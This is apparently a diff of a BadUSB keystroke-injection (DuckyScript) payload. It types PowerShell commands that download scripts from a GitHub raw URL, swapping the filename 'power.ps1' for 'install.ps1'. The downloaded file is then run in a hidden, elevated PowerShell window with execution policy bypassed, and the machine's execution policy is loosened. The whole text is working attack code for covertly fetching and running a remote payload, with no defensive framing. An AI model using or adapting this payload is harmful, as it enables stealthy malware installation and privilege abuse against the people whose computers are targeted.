@@ -15,10 +15,10 @@ ENTER
 STRING (new-object net.webclient).DownloadFile('https://raw.githubusercontent.com/codexpuz/lol/main/poc.ps1','poc.ps1') 
 DELAY 500 
 ENTER
-STRING STRING (new-object net.webclient).DownloadFile('https://raw.githubusercontent.com/codexpuz/lol/main/power.ps1','power.ps1')
+STRING STRING (new-object net.webclient).DownloadFile('https://raw.githubusercontent.com/codexpuz/lol/main/install.ps1','install.ps1')
 DELAY 700
 ENTER
-STRING Start-Process powershell -WindowStyle Hidden -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File power.ps1"
+STRING Start-Process powershell -WindowStyle Hidden -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File install.ps1"
 DELAY 1500
 ENTER
 STRING Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Force 
